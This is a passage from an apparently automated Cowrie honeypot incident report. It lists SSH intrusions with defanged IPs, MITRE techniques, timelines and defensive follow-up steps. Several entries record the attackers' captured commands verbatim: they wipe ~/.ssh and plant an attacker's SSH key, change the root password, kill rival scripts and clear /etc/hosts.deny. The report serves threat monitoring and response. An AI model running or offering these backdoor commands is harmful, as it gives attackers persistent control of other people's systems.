| `2026-06-09 20:06:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.89.136[.]111` to AbuseIPDB if not already reported
- [ ] Block `103.89.136[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e110642bbf4

| Field | Detail |
|---|---|
| **Source IP** | `103.89.136[.]111` |
| **First Seen** | 2026-06-09 20:06 |
| **Last Seen** | 2026-06-09 20:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:06:21` | `cowrie.session.connect` |
| `2026-06-09 20:06:21` | `cowrie.client.version` |
| `2026-06-09 20:06:21` | `cowrie.client.kex` |
| `2026-06-09 20:06:21` | `cowrie.login.success` |
| `2026-06-09 20:06:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.89.136[.]111` to AbuseIPDB if not already reported
- [ ] Block `103.89.136[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-310751abc416

| Field | Detail |
|---|---|
| **Source IP** | `138.124.158[.]150` |
| **First Seen** | 2026-06-09 20:07 |
| **Last Seen** | 2026-06-09 20:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:07:50` | `cowrie.session.connect` |
| `2026-06-09 20:07:50` | `cowrie.client.version` |
| `2026-06-09 20:07:50` | `cowrie.client.kex` |
| `2026-06-09 20:07:51` | `cowrie.login.success` |
| `2026-06-09 20:07:52` | `cowrie.session.params` |
| `2026-06-09 20:07:52` | `cowrie.command.input` |
| `2026-06-09 20:07:52` | `cowrie.command.failed` |
| `2026-06-09 20:07:52` | `cowrie.log.closed` |
| `2026-06-09 20:07:53` | `cowrie.session.params` |
| `2026-06-09 20:07:53` | `cowrie.command.input` |
| `2026-06-09 20:07:53` | `cowrie.session.file_download` |
| `2026-06-09 20:07:53` | `cowrie.log.closed` |
| `2026-06-09 20:07:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.158[.]150` to AbuseIPDB if not already reported
- [ ] Block `138.124.158[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66462ede4fb0

| Field | Detail |
|---|---|
| **Source IP** | `101.126.82[.]218` |
| **First Seen** | 2026-06-09 20:07 |
| **Last Seen** | 2026-06-09 20:08 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:19YiE4K5PaqR"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:07:56` | `cowrie.session.connect` |
| `2026-06-09 20:07:56` | `cowrie.client.version` |
| `2026-06-09 20:07:56` | `cowrie.client.kex` |
| `2026-06-09 20:07:57` | `cowrie.login.success` |
| `2026-06-09 20:07:57` | `cowrie.session.params` |
| `2026-06-09 20:07:57` | `cowrie.command.input` |
| `2026-06-09 20:07:57` | `cowrie.command.failed` |
| `2026-06-09 20:07:57` | `cowrie.log.closed` |
| `2026-06-09 20:07:57` | `cowrie.session.params` |
| `2026-06-09 20:07:57` | `cowrie.command.input` |
| `2026-06-09 20:07:58` | `cowrie.session.file_download` |
| `2026-06-09 20:07:58` | `cowrie.log.closed` |
| `2026-06-09 20:08:10` | `cowrie.session.params` |
| `2026-06-09 20:08:10` | `cowrie.command.input` |
| `2026-06-09 20:08:10` | `cowrie.log.closed` |
| `2026-06-09 20:08:10` | `cowrie.session.params` |
| `2026-06-09 20:08:10` | `cowrie.command.input` |
| `2026-06-09 20:08:11` | `cowrie.log.closed` |
| `2026-06-09 20:08:11` | `cowrie.session.params` |
| `2026-06-09 20:08:11` | `cowrie.command.input` |
| `2026-06-09 20:08:11` | `cowrie.session.file_download` |
| `2026-06-09 20:08:11` | `cowrie.log.closed` |
| `2026-06-09 20:08:12` | `cowrie.session.params` |
| `2026-06-09 20:08:12` | `cowrie.command.input` |
| `2026-06-09 20:08:12` | `cowrie.log.closed` |
| `2026-06-09 20:08:12` | `cowrie.session.params` |
| `2026-06-09 20:08:12` | `cowrie.command.input` |
| `2026-06-09 20:08:12` | `cowrie.log.closed` |
| `2026-06-09 20:08:13` | `cowrie.session.params` |
| `2026-06-09 20:08:13` | `cowrie.command.input` |
| `2026-06-09 20:08:13` | `cowrie.command.input` |
| `2026-06-09 20:08:13` | `cowrie.log.closed` |
| `2026-06-09 20:08:13` | `cowrie.session.params` |
| `2026-06-09 20:08:13` | `cowrie.command.input` |
| `2026-06-09 20:08:13` | `cowrie.log.closed` |
| `2026-06-09 20:08:14` | `cowrie.session.params` |
| `2026-06-09 20:08:14` | `cowrie.command.input` |
| `2026-06-09 20:08:14` | `cowrie.log.closed` |
| `2026-06-09 20:08:14` | `cowrie.session.params` |
| `2026-06-09 20:08:14` | `cowrie.command.input` |
| `2026-06-09 20:08:14` | `cowrie.log.closed` |
| `2026-06-09 20:08:15` | `cowrie.session.params` |
| `2026-06-09 20:08:15` | `cowrie.command.input` |
| `2026-06-09 20:08:15` | `cowrie.log.closed` |
| `2026-06-09 20:08:15` | `cowrie.session.params` |
| `2026-06-09 20:08:15` | `cowrie.command.input` |
| `2026-06-09 20:08:15` | `cowrie.log.closed` |
| `2026-06-09 20:08:16` | `cowrie.session.params` |
| `2026-06-09 20:08:16` | `cowrie.command.input` |
| `2026-06-09 20:08:16` | `cowrie.log.closed` |
| `2026-06-09 20:08:16` | `cowrie.session.params` |
| `2026-06-09 20:08:16` | `cowrie.command.input` |
| `2026-06-09 20:08:17` | `cowrie.log.closed` |
| `2026-06-09 20:08:17` | `cowrie.session.params` |
| `2026-06-09 20:08:17` | `cowrie.command.input` |
| `2026-06-09 20:08:17` | `cowrie.log.closed` |
| `2026-06-09 20:08:17` | `cowrie.session.params` |
| `2026-06-09 20:08:17` | `cowrie.command.input` |
| `2026-06-09 20:08:18` | `cowrie.log.closed` |
| `2026-06-09 20:08:18` | `cowrie.session.params` |
| `2026-06-09 20:08:18` | `cowrie.command.input` |
| `2026-06-09 20:08:18` | `cowrie.log.closed` |
| `2026-06-09 20:08:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.82[.]218` to AbuseIPDB if not already reported
- [ ] Block `101.126.82[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5d9dc82c7ef

| Field | Detail |
|---|---|
| **Source IP** | `138.124.158[.]150` |
| **First Seen** | 2026-06-09 20:07 |
| **Last Seen** | 2026-06-09 20:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:07:56` | `cowrie.session.connect` |
| `2026-06-09 20:07:56` | `cowrie.client.version` |
| `2026-06-09 20:07:56` | `cowrie.client.kex` |
| `2026-06-09 20:07:57` | `cowrie.login.success` |
| `2026-06-09 20:07:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.158[.]150` to AbuseIPDB if not already reported
- [ ] Block `138.124.158[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5daf37c09fcf

| Field | Detail |
|---|---|
| **Source IP** | `103.89.136[.]111` |
| **First Seen** | 2026-06-09 20:08 |
| **Last Seen** | 2026-06-09 20:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:08:53` | `cowrie.session.connect` |
| `2026-06-09 20:08:53` | `cowrie.client.version` |
| `2026-06-09 20:08:53` | `cowrie.client.kex` |
| `2026-06-09 20:08:53` | `cowrie.login.success` |
| `2026-06-09 20:08:53` | `cowrie.session.params` |
| `2026-06-09 20:08:53` | `cowrie.command.input` |
| `2026-06-09 20:08:53` | `cowrie.command.failed` |
| `2026-06-09 20:08:53` | `cowrie.log.closed` |
| `2026-06-09 20:08:53` | `cowrie.session.params` |
| `2026-06-09 20:08:53` | `cowrie.command.input` |
| `2026-06-09 20:08:53` | `cowrie.session.file_download` |
| `2026-06-09 20:08:53` | `cowrie.log.closed` |
| `2026-06-09 20:08:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.89.136[.]111` to AbuseIPDB if not already reported
- [ ] Block `103.89.136[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fb31e5e4fda

| Field | Detail |
|---|---|
| **Source IP** | `103.89.136[.]111` |
| **First Seen** | 2026-06-09 20:08 |
| **Last Seen** | 2026-06-09 20:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:08:55` | `cowrie.session.connect` |
| `2026-06-09 20:08:55` | `cowrie.client.version` |
| `2026-06-09 20:08:55` | `cowrie.client.kex` |
| `2026-06-09 20:08:55` | `cowrie.login.success` |
| `2026-06-09 20:08:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.89.136[.]111` to AbuseIPDB if not already reported
- [ ] Block `103.89.136[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8840219bf17e

| Field | Detail |
|---|---|
| **Source IP** | `101.126.82[.]218` |
| **First Seen** | 2026-06-09 20:10 |
| **Last Seen** | 2026-06-09 20:10 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cat /proc/cpuinfo | grep name | wc -l, echo "root:mj8PjTwn8RXB"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;, cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'` |
| **Download Attempts** | 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:10:20` | `cowrie.session.connect` |
| `2026-06-09 20:10:20` | `cowrie.client.version` |
| `2026-06-09 20:10:21` | `cowrie.client.kex` |
| `2026-06-09 20:10:21` | `cowrie.login.success` |
| `2026-06-09 20:10:21` | `cowrie.session.params` |
| `2026-06-09 20:10:21` | `cowrie.command.input` |
| `2026-06-09 20:10:21` | `cowrie.command.failed` |
| `2026-06-09 20:10:28` | `cowrie.log.closed` |
| `2026-06-09 20:10:40` | `cowrie.session.params` |
| `2026-06-09 20:10:40` | `cowrie.command.input` |
| `2026-06-09 20:10:40` | `cowrie.log.closed` |
| `2026-06-09 20:10:40` | `cowrie.session.params` |
| `2026-06-09 20:10:40` | `cowrie.command.input` |
| `2026-06-09 20:10:41` | `cowrie.log.closed` |
| `2026-06-09 20:10:41` | `cowrie.session.params` |
| `2026-06-09 20:10:41` | `cowrie.command.input` |
| `2026-06-09 20:10:41` | `cowrie.session.file_download` |
| `2026-06-09 20:10:41` | `cowrie.log.closed` |
| `2026-06-09 20:10:41` | `cowrie.session.params` |
| `2026-06-09 20:10:41` | `cowrie.command.input` |
| `2026-06-09 20:10:42` | `cowrie.log.closed` |
| `2026-06-09 20:10:42` | `cowrie.session.params` |
| `2026-06-09 20:10:42` | `cowrie.command.input` |
| `2026-06-09 20:10:42` | `cowrie.log.closed` |
| `2026-06-09 20:10:42` | `cowrie.session.params` |
| `2026-06-09 20:10:42` | `cowrie.command.input` |
| `2026-06-09 20:10:42` | `cowrie.command.input` |
| `2026-06-09 20:10:43` | `cowrie.log.closed` |
| `2026-06-09 20:10:43` | `cowrie.session.params` |
| `2026-06-09 20:10:43` | `cowrie.command.input` |
| `2026-06-09 20:10:43` | `cowrie.log.closed` |
| `2026-06-09 20:10:44` | `cowrie.session.params` |
| `2026-06-09 20:10:44` | `cowrie.command.input` |
| `2026-06-09 20:10:44` | `cowrie.log.closed` |
| `2026-06-09 20:10:44` | `cowrie.session.params` |
| `2026-06-09 20:10:44` | `cowrie.command.input` |
| `2026-06-09 20:10:44` | `cowrie.log.closed` |
| `2026-06-09 20:10:45` | `cowrie.session.params` |
| `2026-06-09 20:10:45` | `cowrie.command.input` |
| `2026-06-09 20:10:45` | `cowrie.log.closed` |
| `2026-06-09 20:10:45` | `cowrie.session.params` |
| `2026-06-09 20:10:45` | `cowrie.command.input` |
| `2026-06-09 20:10:45` | `cowrie.log.closed` |
| `2026-06-09 20:10:46` | `cowrie.session.params` |
| `2026-06-09 20:10:46` | `cowrie.command.input` |
| `2026-06-09 20:10:46` | `cowrie.log.closed` |
| `2026-06-09 20:10:46` | `cowrie.session.params` |
| `2026-06-09 20:10:46` | `cowrie.command.input` |
| `2026-06-09 20:10:46` | `cowrie.log.closed` |
| `2026-06-09 20:10:47` | `cowrie.session.params` |
| `2026-06-09 20:10:47` | `cowrie.command.input` |
| `2026-06-09 20:10:47` | `cowrie.log.closed` |
| `2026-06-09 20:10:47` | `cowrie.session.params` |
| `2026-06-09 20:10:47` | `cowrie.command.input` |
| `2026-06-09 20:10:48` | `cowrie.log.closed` |
| `2026-06-09 20:10:48` | `cowrie.session.params` |
| `2026-06-09 20:10:48` | `cowrie.command.input` |
| `2026-06-09 20:10:48` | `cowrie.log.closed` |
| `2026-06-09 20:10:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.82[.]218` to AbuseIPDB if not already reported
- [ ] Block `101.126.82[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eba48d69649c

| Field | Detail |
|---|---|
| **Source IP** | `121.229.191[.]90` |
| **First Seen** | 2026-06-09 20:14 |
| **Last Seen** | 2026-06-09 20:14 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:FKo3vXmZOd9Z"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:14:28` | `cowrie.session.connect` |
| `2026-06-09 20:14:28` | `cowrie.client.version` |
| `2026-06-09 20:14:28` | `cowrie.client.kex` |
| `2026-06-09 20:14:28` | `cowrie.login.success` |
| `2026-06-09 20:14:29` | `cowrie.session.params` |
| `2026-06-09 20:14:29` | `cowrie.command.input` |
| `2026-06-09 20:14:29` | `cowrie.command.failed` |
| `2026-06-09 20:14:29` | `cowrie.log.closed` |
| `2026-06-09 20:14:29` | `cowrie.session.params` |
| `2026-06-09 20:14:29` | `cowrie.command.input` |
| `2026-06-09 20:14:29` | `cowrie.session.file_download` |
| `2026-06-09 20:14:29` | `cowrie.log.closed` |
| `2026-06-09 20:14:42` | `cowrie.session.params` |
| `2026-06-09 20:14:42` | `cowrie.command.input` |
| `2026-06-09 20:14:42` | `cowrie.log.closed` |
| `2026-06-09 20:14:42` | `cowrie.session.params` |
| `2026-06-09 20:14:42` | `cowrie.command.input` |
| `2026-06-09 20:14:42` | `cowrie.log.closed` |
| `2026-06-09 20:14:42` | `cowrie.session.params` |
| `2026-06-09 20:14:42` | `cowrie.command.input` |
| `2026-06-09 20:14:43` | `cowrie.session.file_download` |
| `2026-06-09 20:14:43` | `cowrie.log.closed` |
| `2026-06-09 20:14:43` | `cowrie.session.params` |
| `2026-06-09 20:14:43` | `cowrie.command.input` |
| `2026-06-09 20:14:43` | `cowrie.log.closed` |
| `2026-06-09 20:14:43` | `cowrie.session.params` |
| `2026-06-09 20:14:43` | `cowrie.command.input` |
| `2026-06-09 20:14:44` | `cowrie.log.closed` |
| `2026-06-09 20:14:44` | `cowrie.session.params` |
| `2026-06-09 20:14:44` | `cowrie.command.input` |
| `2026-06-09 20:14:44` | `cowrie.command.input` |
| `2026-06-09 20:14:44` | `cowrie.log.closed` |
| `2026-06-09 20:14:44` | `cowrie.session.params` |
| `2026-06-09 20:14:44` | `cowrie.command.input` |
| `2026-06-09 20:14:44` | `cowrie.log.closed` |
| `2026-06-09 20:14:45` | `cowrie.session.params` |
| `2026-06-09 20:14:45` | `cowrie.command.input` |
| `2026-06-09 20:14:45` | `cowrie.log.closed` |
| `2026-06-09 20:14:45` | `cowrie.session.params` |
| `2026-06-09 20:14:45` | `cowrie.command.input` |
| `2026-06-09 20:14:45` | `cowrie.log.closed` |
| `2026-06-09 20:14:46` | `cowrie.session.params` |
| `2026-06-09 20:14:46` | `cowrie.command.input` |
| `2026-06-09 20:14:46` | `cowrie.log.closed` |
| `2026-06-09 20:14:46` | `cowrie.session.params` |
| `2026-06-09 20:14:46` | `cowrie.command.input` |
| `2026-06-09 20:14:46` | `cowrie.log.closed` |
| `2026-06-09 20:14:47` | `cowrie.session.params` |
| `2026-06-09 20:14:47` | `cowrie.command.input` |
| `2026-06-09 20:14:47` | `cowrie.log.closed` |
| `2026-06-09 20:14:47` | `cowrie.session.params` |
| `2026-06-09 20:14:47` | `cowrie.command.input` |
| `2026-06-09 20:14:47` | `cowrie.log.closed` |
| `2026-06-09 20:14:47` | `cowrie.session.params` |
| `2026-06-09 20:14:47` | `cowrie.command.input` |
| `2026-06-09 20:14:48` | `cowrie.log.closed` |
| `2026-06-09 20:14:48` | `cowrie.session.params` |
| `2026-06-09 20:14:48` | `cowrie.command.input` |
| `2026-06-09 20:14:48` | `cowrie.log.closed` |
| `2026-06-09 20:14:48` | `cowrie.session.params` |
| `2026-06-09 20:14:48` | `cowrie.command.input` |
| `2026-06-09 20:14:48` | `cowrie.log.closed` |
| `2026-06-09 20:14:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.191[.]90` to AbuseIPDB if not already reported
- [ ] Block `121.229.191[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53fa20f4c75c

| Field | Detail |
|---|---|
| **Source IP** | `121.229.191[.]90` |
| **First Seen** | 2026-06-09 20:17 |
| **Last Seen** | 2026-06-09 20:17 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:jGDW95ahxyPK"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:17:02` | `cowrie.session.connect` |
| `2026-06-09 20:17:02` | `cowrie.client.version` |
| `2026-06-09 20:17:02` | `cowrie.client.kex` |
| `2026-06-09 20:17:02` | `cowrie.login.success` |
| `2026-06-09 20:17:03` | `cowrie.session.params` |
| `2026-06-09 20:17:03` | `cowrie.command.input` |
| `2026-06-09 20:17:03` | `cowrie.command.failed` |
| `2026-06-09 20:17:03` | `cowrie.log.closed` |
| `2026-06-09 20:17:03` | `cowrie.session.params` |
| `2026-06-09 20:17:03` | `cowrie.command.input` |
| `2026-06-09 20:17:03` | `cowrie.session.file_download` |
| `2026-06-09 20:17:03` | `cowrie.log.closed` |
| `2026-06-09 20:17:15` | `cowrie.session.params` |
| `2026-06-09 20:17:15` | `cowrie.command.input` |
| `2026-06-09 20:17:16` | `cowrie.log.closed` |
| `2026-06-09 20:17:16` | `cowrie.session.params` |
| `2026-06-09 20:17:16` | `cowrie.command.input` |
| `2026-06-09 20:17:16` | `cowrie.log.closed` |
| `2026-06-09 20:17:17` | `cowrie.session.params` |
| `2026-06-09 20:17:17` | `cowrie.command.input` |
| `2026-06-09 20:17:17` | `cowrie.session.file_download` |
| `2026-06-09 20:17:17` | `cowrie.log.closed` |
| `2026-06-09 20:17:17` | `cowrie.session.params` |
| `2026-06-09 20:17:17` | `cowrie.command.input` |
| `2026-06-09 20:17:17` | `cowrie.log.closed` |
| `2026-06-09 20:17:17` | `cowrie.session.params` |
| `2026-06-09 20:17:17` | `cowrie.command.input` |
| `2026-06-09 20:17:18` | `cowrie.log.closed` |
| `2026-06-09 20:17:18` | `cowrie.session.params` |
| `2026-06-09 20:17:18` | `cowrie.command.input` |
| `2026-06-09 20:17:18` | `cowrie.command.input` |
| `2026-06-09 20:17:18` | `cowrie.log.closed` |
| `2026-06-09 20:17:18` | `cowrie.session.params` |
| `2026-06-09 20:17:18` | `cowrie.command.input` |
| `2026-06-09 20:17:19` | `cowrie.log.closed` |
| `2026-06-09 20:17:19` | `cowrie.session.params` |
| `2026-06-09 20:17:19` | `cowrie.command.input` |
| `2026-06-09 20:17:19` | `cowrie.log.closed` |
| `2026-06-09 20:17:19` | `cowrie.session.params` |
| `2026-06-09 20:17:19` | `cowrie.command.input` |
| `2026-06-09 20:17:20` | `cowrie.log.closed` |
| `2026-06-09 20:17:20` | `cowrie.session.params` |
| `2026-06-09 20:17:20` | `cowrie.command.input` |
| `2026-06-09 20:17:20` | `cowrie.log.closed` |
| `2026-06-09 20:17:20` | `cowrie.session.params` |
| `2026-06-09 20:17:20` | `cowrie.command.input` |
| `2026-06-09 20:17:21` | `cowrie.log.closed` |
| `2026-06-09 20:17:21` | `cowrie.session.params` |
| `2026-06-09 20:17:21` | `cowrie.command.input` |
| `2026-06-09 20:17:21` | `cowrie.log.closed` |
